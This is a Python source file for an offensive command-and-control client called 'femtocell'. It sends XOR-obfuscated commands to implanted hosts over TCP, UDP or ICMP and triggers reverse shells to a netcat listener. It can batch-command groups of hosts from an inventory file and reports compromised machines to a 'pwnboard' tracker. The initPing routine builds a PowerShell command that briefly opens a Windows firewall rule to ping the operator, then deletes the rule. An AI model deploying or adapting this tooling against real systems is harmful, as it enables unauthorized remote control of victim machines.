#!/usr/bin/env python3

import scapy.all as scapy
from termcolor import colored
import nclib
import confuse
import socket
import requests
import multiprocessing
import time
import os

import handle_args
import handle_interactive

parsedConfig = {}

interface = None

baseparams = {"MODE": None, "FILE": None, "XOR": True, "PWNBOARD": None}

cmdparams = {
    "RHOST": None,
    "RPORT": 445,
    "COMMAND": "msg * hi",
    "TRANSPORT": "TCP",
}

shellparams = {
    "RHOST": None,
    "RPORT": 445,
    "LHOST": None,
    "TRANSPORT": "TCP",
}

groupparams = {
    "GROUP": None,
    "RHOST": None,
    "RPORT": 445,
    "COMMAND": "msg * hi",
    "TRANSPORT": "TCP",
}

def main():
    print_banner()

    if os.geteuid() != 0:
        print(colored("[!] You are running without escalated privileges. This might cause errors.\n", "yellow"))

    handle_args.setup_args()
    handle_interactive.interactive_main()


def updatePwnboard(ip, mode):
    data = {"ip": ip, "application": "femtocell", "access_type": mode}
    try:
        req = requests.post(baseparams["PWNBOARD"], json=data, timeout=3)
    except Exception as E:
        print(E)


def listen(params):
    try:
        nc = nclib.Netcat(listen=(params["LHOST"], 443))
        nc.interact() # TODO does the connection close cleanly?
        nc.close()
    except PermissionError:
        print(colored(f"[-] Do not have sufficient permissions to listen on: 443.", "red"))
        return
    except socket.gaierror:
        print(colored(f"[-] Potentially invalid: {params.get('LHOST')}.", "red"))
        return
    
    if baseparams["PWNBOARD"] is not None:
        updatePwnboard(params["RHOST"], "shell")
    print(colored("\n[*] Shell closed.\n", "cyan"))

def pingListen():
    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
    pkts = scapy.sniff( iface=interface, filter="icmp", timeout=15) 
    tCallbacks = []

    for packet in pkts:
        if str(packet.getlayer(scapy.ICMP).type) == "8":
            tCallbacks.append(packet[scapy.IP].src)

    fCallbacks = list(dict.fromkeys(tCallbacks))
    for ip in fCallbacks:
        print(colored(f"[+] Ping received from: {ip}\n", "green"))
        updatePwnboard(ip, "beacon")


def initPing(params):
    if interface is None:
        return None

    import netifaces as ni
    try:
        targetIP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    except TypeError:
        return None
    pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
    return pingmode

def validGroupKey():
    key = groupparams["GROUP"]

    try:
        parsedConfig[key]
    except KeyError:
        print( colored( f"[-] GROUP {key} does not exist. Setting GROUP value back to None.\n", "red",))
        groupparams["GROUP"] = None
        return False

    return True


def getGroup():
    key = groupparams["GROUP"]
    loi = []

    if parsedConfig[key] == "hosts":
            loi.append(parsedConfig[key + ":hosts"])
    elif parsedConfig[key] == "children":
        subgroups = parsedConfig[key + ":children"]
        for item in subgroups:
            loi.append(parsedConfig[item + ":hosts"])

    return loi


def importConfig(op_1):
    config = confuse.Configuration("t", __name__)
    config.set_file(op_1)
    configItems = config["all"]["children"].get()
    for x in configItems:
        parsedConfig[x] = "x"
        if configItems[x].get("hosts"):
            parsedConfig[x] = "hosts"
            hostlist = []
            var = list(configItems[x].get("hosts").keys())[0]
            lIdx = var.find("[")
            rIdx = var.find("]")
            mIdx = var.find(":")
            lVal = var[lIdx + 1 : mIdx]
            rVal = var[mIdx + 1 : rIdx]
            for i in range(int(lVal), int(rVal) + 1):
                lHalf = var[0:lIdx]
                rHalf = var[rIdx + 1 : len(var)]
                hostlist.append(lHalf + str(i) + rHalf)
            parsedConfig[x + ":hosts"] = hostlist
        elif configItems[x].get("children"):
            parsedConfig[x] = "children"
            parsedConfig[x + ":children"] = list(configItems[x].get("children"))

    baseparams["FILE"] = op_1
    baseparams["MODE"] = "GROUP"
    print(colored(f"[+] Config {op_1} loaded. MODE set to GROUP.\n", "green"))


def print_groups():
    key = groupparams["GROUP"]

    if not validGroupKey():
        return

    if parsedConfig[key] == "hosts":
        print(key)
        print(parsedConfig[key + ":hosts"])
    elif parsedConfig[key] == "children":
        subgroups = parsedConfig[key + ":children"]
        for item in subgroups:
            print(item)
            print(parsedConfig[item + ":hosts"])


def print_help(location):
    if location == "sub":
        print( colored( "\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n", "yellow",))
    else:
        print( colored( "\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n", "yellow",))


def print_options(p):
    for item in p.keys():
        if baseparams["MODE"] == "GROUP" and item == "RHOST":
            continue
        print(colored(f"{item}: {p[item]}", "cyan"))
    print()

def print_banner():
    print(
        """
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & m720

    """
    )


def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b""
    for b in byte_msg:
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte


def verify(params):
    passing = False

    if params["TRANSPORT"] in ["TCP", "UDP", "ICMP"]: 
        passing = True
    else:
        print( colored("[-] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red"))
        params["TRANSPORT"] = "TCP"

    if baseparams["MODE"] != "GROUP" and params["RHOST"] is None:
        print(colored("[-] RHOST required.\n", "red"))
        passing = False

    if baseparams["MODE"] == "SHELL" and params["LHOST"] is None:
        print(colored("[-] LHOST required.\n", "red"))
        passing = False

    if baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
        if params["COMMAND"] is None:
            print(colored("[-] COMMAND required.\n", "red"))
            passing = False

    if baseparams["MODE"] == "GROUP" and not validGroupKey():
        passing = False

    return passing


def executeShell(send=False):
    if verify(shellparams):
        ip = shellparams["RHOST"]
        plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
        if not send:
            t = multiprocessing.Process(target=listen, args=(shellparams,))
            t.start() # start listener
        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
        execute(plaintext, shellparams)
        if not send:
            try:
                t.join() # wait until thread is finished
            except KeyboardInterrupt:
                t.terminate()

def executeCmd():
    if verify(cmdparams):
        plaintext = "FC-CM-{}\00".format(cmdparams["COMMAND"])
        ip = cmdparams["RHOST"]
        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
        execute(plaintext, cmdparams)

def executeGroup():
    if verify(groupparams):
        plaintext = "FC-CM-{}\00".format(groupparams["COMMAND"])
        if parsedConfig.get(groupparams.get("GROUP")) is None:
            return
        groupList = getGroup()
        for iplist in groupList:
            for ip in iplist:
                groupparams["RHOST"] = ip
                print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                t = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
                t.start()
            t.join()

def executePing():
    if baseparams["MODE"] == "CMD" and verify(cmdparams):
        plaintext = initPing(cmdparams)
        if plaintext is None:
            print(colored("[!] Interface not set correctly.\n", "yellow"))
            return
        t = multiprocessing.Process(target=pingListen)
        t.start()
        time.sleep(2)
        execute(plaintext, cmdparams)
        t.join()
    elif baseparams["MODE"] == "GROUP" and verify(groupparams):
        if parsedConfig.get(groupparams.get("GROUP")) is None:
            return
        groupList = getGroup()
        plaintext = initPing(groupparams)
        if plaintext is None:
            print(colored("[!] Interface not set correctly.\n", "yellow"))
            return
        t = multiprocessing.Process(target=pingListen)
        t.start()
        time.sleep(2)
        for iplist in groupList:
            for ip in iplist:
                groupparams["RHOST"] = ip
                e = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
                e.start()
        e.join()
        t.join()

    else:
        print(colored("[!] PING only works on GROUP or CMD mode.\n", "yellow"))

def execute(plaintext, params):
    if baseparams["XOR"]:
        payload = xor_encrypt(plaintext.encode(), 0x10)
    else:
        payload = plaintext.encode()

    if params["TRANSPORT"] == "ICMP":
        scapy.send(scapy.IP(dst=params["RHOST"].encode())/
        scapy.ICMP(code=1, type=8)/
        payload, verbose=False)
        return

    if params["TRANSPORT"] == "UDP":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    elif params["TRANSPORT"] == "TCP":
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(5)
    try:
        sock.connect((params["RHOST"], params["RPORT"]))
        sock.send(payload)
    except socket.gaierror:
        print(colored(f"[-] Potentially invalid: {params.get('RHOST')} or {params.get('RPORT')}.", "red"))
    except (TimeoutError, ConnectionRefusedError, socket.timeout):
        print(colored(f"[-] Port {params.get('RPORT')} not open on {params.get('RHOST')}.", "red"))
    finally:
        sock.close()


if __name__ == "__main__":
    main()
